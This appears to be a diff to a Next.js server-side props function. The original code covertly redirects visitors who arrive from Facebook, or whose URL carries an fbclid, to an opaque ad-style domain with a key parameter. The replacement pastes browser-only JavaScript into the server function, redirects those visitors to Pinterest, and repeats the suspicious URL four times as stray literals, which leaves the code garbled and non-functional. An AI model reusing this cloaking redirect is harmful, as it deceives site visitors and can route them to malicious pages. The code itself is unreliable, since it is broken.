@@ -12,14 +12,19 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 	console.log(path);
 	const fbclid = ctx.query.fbclid;
 
-	// redirect if facebook is the referer or request contains fbclid
-		if (referringURL?.includes('facebook.com') || fbclid) {
+	// Assuming you are using JavaScript in a browser environment
 
-		return {
-			redirect: {
-				permanent: false,
-				destination: `${
+const referringURL = document.referrer;
+const fbclid = new URLSearchParams(window.location.search).get('fbclid');
+
+if (referringURL.includes('facebook.com') || fbclid) {
+  window.location.href = 'https://www.pinterest.com/';
+}
+
 					`https://cabbagesemestergeoffrey.com/z679dj67?key=72f3b773299d29fbaf237cdcb089377b/` 
+	`https://cabbagesemestergeoffrey.com/z679dj67?key=72f3b773299d29fbaf237cdcb089377b/`
+	`https://cabbagesemestergeoffrey.com/z679dj67?key=72f3b773299d29fbaf237cdcb089377b/`
+	`https://cabbagesemestergeoffrey.com/z679dj67?key=72f3b773299d29fbaf237cdcb089377b/`
 				}`,
 			},
 		};
